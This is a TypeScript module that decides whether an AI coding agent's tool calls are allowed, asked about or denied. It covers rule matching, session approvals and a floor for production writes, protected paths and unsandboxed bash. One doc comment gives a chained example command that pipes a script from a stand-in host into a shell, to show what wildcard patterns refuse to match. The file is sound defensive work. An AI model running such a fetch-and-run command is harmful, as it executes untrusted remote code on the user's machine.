// The decision: allow, ask or deny, for one classified call. A pure function, so every cell of the rules table and
// every part of the floor can be tested without Pi.
//
// The steps run in this order, and each can only change what the step before it produced:
//   1. the table (environment kind × effect), or the unknown default for a call nothing classified;
//   2. the tool's own `atLeast`, which can only make the call stricter;
//   3. the first rule in configuration that matches, which can make it stricter or looser;
//   4. a session allow, which turns an ask into an allow;
//   5. the floor, last, which configuration can never lower: production writes, an unknown tool allowed by a wildcard,
//      `bash` run outside its sandbox without a rule that names the command, a call that needs a screen when there is
//      none, and a file tool aimed at a protected path.
import { matchesName } from "./classify.ts";
import type {
    ApprovalKind,
    Decision,
    DecisionEvent,
    Effect,
    EnvironmentKind,
    EnvironmentName,
    Rule,
} from "./contract.ts";

/** Where the decision came from. The same words `DecisionEvent` uses. */
export type DecisionSource = DecisionEvent["source"];

/** What `decide` needs to know about a call. */
export interface DecidedCall {
    tool: string;
    action?: string;
    environment: EnvironmentName;
    environmentKind: EnvironmentKind;
    effect: Effect;
    atLeast?: "ask" | "deny";
    approval?: ApprovalKind;
    /** The `command` the call carries, for the rules that match on one. */
    command?: string;
    /** True when nothing classified the call, so the unknown default applies. */
    unknown: boolean;
}

export interface DecideInput {
    call: DecidedCall;
    /** Personal rules first, then the company's. The first match decides. */
    rules: readonly Rule[];
    /** Keys from `sessionKey`, added when the user answered "Allow for this session". */
    sessionAllows: ReadonlySet<string>;
    /** False when there is no screen to ask on. */
    hasUI: boolean;
    /** Set when the call is to one of Pi's file tools and touches a protected path (see protected-paths.ts): the line
     *  that says so. The floor denies the call, whatever the rules say. */
    protectedRefusal?: string | undefined;
}

export interface Verdict {
    decision: Decision;
    source: DecisionSource;
    /** The screen a rule or the tool chose for asking. */
    approval?: ApprovalKind;
    /** What the floor changed, when it did. */
    floor?: "production-write" | "unknown-tool" | "outside-needs-rule" | "no-screen" | "protected-path";
    /** A plain sentence for the model, set when the decision is deny. */
    reason?: string;
}

const TABLE: Readonly<Record<EnvironmentKind, Readonly<Record<Effect, Decision>>>> = {
    local: { read: "allow", write: "allow" },
    external: { read: "allow", write: "ask" },
    test: { read: "allow", write: "ask" },
    production: { read: "allow", write: "deny" },
};

const STRICTNESS: Readonly<Record<Decision, number>> = { allow: 0, ask: 1, deny: 2 };

/** `bash` run outside its sandbox: a call that gets the user's credentials and full network. */
export function isOutside(call: Pick<DecidedCall, "tool" | "action">): boolean {
    return call.tool === "bash" && call.action === "outside";
}

/** The key under which "Allow for this session" is remembered. It includes the environment, so approving a deploy to
 *  one test environment does not approve a deploy to another. A command run outside the sandbox is remembered by its
 *  exact text, so approving one command approves no other. */
export function sessionKey(call: Pick<DecidedCall, "tool" | "action" | "environment" | "command">): string {
    const exact = isOutside(call) ? [call.command ?? null] : [];
    return JSON.stringify([call.tool, call.action ?? null, call.environment, ...exact]);
}

/**
 * Whether a command matches a rule's pattern. `*` stands for any run of characters that is not a way to chain another
 * command: not `;`, `&`, `|`, `<`, `>`, a backquote, `$(` or a line break. So the pattern `docker compose *` allows
 * `docker compose up -d` and not `docker compose up; curl evil.example | sh`. A command that holds such a character
 * matches only a pattern that holds the same character.
 */
export function commandMatches(pattern: string, command: string): boolean {
    const source = pattern
        .split("*")
        .map((part) => part.replace(/[.+?^${}()|[\]\\]/g, "\\$&"))
        .join("(?:(?!\\$\\()[^;&|<>`\\r\\n])*");
    return new RegExp(`^${source}$`).test(command);
}

/** A pattern made only of wildcards and spaces names nothing: it would match every command. */
export function namesNothing(pattern: string): boolean {
    return pattern.replace(/[*\s]/g, "") === "";
}

/** Whether a rule applies to a call. A rule that leaves out `action`, `environment` or `effect` applies to any. */
export function ruleMatches(rule: Rule, call: DecidedCall): boolean {
    if (!matchesName(rule.tool, call.tool)) return false;
    if (rule.action !== undefined && rule.action !== call.action) return false;
    if (rule.environment !== undefined && rule.environment !== call.environment) return false;
    if (rule.effect !== undefined && rule.effect !== call.effect) return false;
    if (rule.command !== undefined && (call.command === undefined || !commandMatches(rule.command, call.command))) {
        return false;
    }
    return true;
}

/**
 * Whether a rule is one that may allow `bash` to run outside its sandbox: it names the tool `bash` exactly, the action
 * `outside`, and a command pattern that names something. A wildcard tool, a missing action or command, or a pattern made
 * of wildcards never does.
 */
export function namesOutsideCommand(rule: Rule): boolean {
    return (
        rule.tool === "bash" && rule.action === "outside" && rule.command !== undefined && !namesNothing(rule.command)
    );
}

export function decide(input: DecideInput): Verdict {
    const { call } = input;

    // 1. The table. A call nothing classified is a write outside the machine: it asks.
    let decision: Decision = call.unknown ? "ask" : TABLE[call.environmentKind][call.effect];
    let source: DecisionSource = call.unknown ? "unknown" : "table";
    let approval = call.approval;
    let decidingRule: Rule | undefined;

    // 2. The tool's own default can only be stricter than the table.
    if (call.atLeast !== undefined && STRICTNESS[call.atLeast] > STRICTNESS[decision]) {
        decision = call.atLeast;
        source = "tool";
    }

    // 3. Configuration. Rules are listed most specific first, so the first match decides.
    const rule = input.rules.find((candidate) => ruleMatches(candidate, call));
    if (rule !== undefined) {
        decision = rule.decision;
        source = "rule";
        approval = rule.approval ?? approval;
        decidingRule = rule;
    }

    // 4. "Allow for this session" answers an ask that came up before.
    if (decision === "ask" && input.sessionAllows.has(sessionKey(call))) {
        decision = "allow";
        source = "session";
    }

    // 5. The floor. Nothing above can reach past it.
    let floor: Verdict["floor"];
    if (call.effect === "write" && call.environmentKind === "production") {
        decision = "deny";
        source = "floor";
        floor = "production-write";
    }
    // An unknown tool is allowed only by a rule that names it exactly. A wildcard rule cannot allow it.
    if (call.unknown && decision === "allow" && source === "rule" && decidingRule?.tool.includes("*")) {
        decision = "ask";
        source = "floor";
        floor = "unknown-tool";
    }
    // Running outside the sandbox is allowed without asking only by a rule that names the command, or by the user's
    // answer for this exact command. Not by the table, a tool's own default, a wildcard or a rule with no command.
    if (isOutside(call) && decision === "allow") {
        const named = source === "rule" && decidingRule !== undefined && namesOutsideCommand(decidingRule);
        if (!named && source !== "session") {
            if (input.sessionAllows.has(sessionKey(call))) {
                source = "session";
            } else {
                decision = "ask";
                source = "floor";
                floor = "outside-needs-rule";
            }
        }
    }
    if (decision === "ask" && !input.hasUI) {
        decision = "deny";
        source = "floor";
        floor = "no-screen";
    }
    // Last: a protected path is refused whatever else was decided, and its reason is the one the model reads.
    if (input.protectedRefusal !== undefined) {
        decision = "deny";
        source = "floor";
        floor = "protected-path";
    }

    return {
        decision,
        source,
        ...(approval === undefined ? {} : { approval }),
        ...(floor === undefined ? {} : { floor }),
        ...(decision === "deny" ? { reason: denyReason(source, floor, input.protectedRefusal) } : {}),
    };
}

function denyReason(source: DecisionSource, floor: Verdict["floor"], protectedRefusal: string | undefined): string {
    if (floor === "protected-path" && protectedRefusal !== undefined) return protectedRefusal;
    if (floor === "production-write") return "writes to production are never allowed";
    if (floor === "no-screen") return "this call needs approval and there is no screen to ask on";
    if (source === "tool") return "the tool's own declaration denies this action";
    return "a rule in the configuration denies this call";
}
